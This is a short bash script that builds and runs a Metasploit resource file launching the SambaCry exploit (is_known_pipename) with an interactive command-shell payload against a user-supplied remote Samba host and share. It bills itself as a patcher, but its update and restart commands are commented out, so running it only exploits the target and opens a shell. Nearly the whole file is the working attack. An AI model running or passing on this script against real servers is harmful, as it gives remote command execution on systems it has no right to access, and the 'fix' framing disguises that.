#!/bin/bash
clear
echo "***************************************************************"
echo "       EXPLOITER SAMBACRY PaTcHeR for GUEST  USER              "
echo "   Lets fix the Debian Samba via this exploit and patch it     "
echo "***************************************************************"
echo -e "What IP of remote Samba ?  \c"
read host
echo -e "What is the share name ? : \c"
read name 
echo '[*] Checking if metasploit is present..'
if [ -x ./msfconsole ]; then
echo '[*] Found msfconsole in current path ........ good'
else
   echo '[-] No msfconsole in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 

echo 'use exploit/linux/samba/is_known_pipename' > samba.rc
echo 'set PAYLOAD cmd/unix/interact' >> samba.rc
echo -n 'set RHOST ' >> samba.rc
echo -n $host >> samba.rc 
echo '' >> samba.rc 
echo -n  'set SMB_SHARE_NAME ' >> samba.rc 
echo -n  $name >> samba.rc 
echo '' >> samba.rc
echo 'exploit ' >> samba.rc
#echo 'apt-get update -y' >> samba.rc 
#echo 'apt-get upgrade samba -y' >> samba.rc
#echo '/etc/init.d/samba restart' >> samba.rc
echo './msfconsole -r samba.rc' > fix-samba.sh 
chmod +x ./fix-samba.sh 
./fix-samba.sh
 
